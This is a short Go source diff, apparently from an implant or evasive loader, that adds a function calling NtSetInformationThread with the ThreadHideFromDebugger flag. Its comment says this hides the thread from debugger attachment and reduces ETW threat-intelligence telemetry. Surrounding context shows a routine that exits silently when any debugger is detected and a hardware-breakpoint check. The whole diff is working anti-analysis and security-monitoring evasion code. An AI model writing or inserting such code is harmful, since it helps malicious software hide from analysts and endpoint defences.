@@ -184,6 +184,22 @@ func ntQueryHWBP() bool {
 	return dr0|dr1|dr2|dr3 != 0
 }
 
+// hideThreadFromDebugger sets the ThreadHideFromDebugger flag on the current
+// thread via NtSetInformationThread.  This makes the thread invisible to
+// debugger-attach notifications at the kernel level and reduces ETW-TI
+// telemetry surfaced for this thread.
+func hideThreadFromDebugger() {
+	proc := NewHGProc("NtSetInformationThread")
+	if proc == nil {
+		return
+	}
+	const (
+		threadHideFromDebugger = 17
+		ntCurrentThread        = ^uintptr(1) // (HANDLE)-2
+	)
+	proc.Call(ntCurrentThread, uintptr(threadHideFromDebugger), 0, 0)
+}
+
 // evadeDebugger exits silently if a debugger is detected via any method.
 func evadeDebugger() {
 	if isDebuggerPresentWin() ||
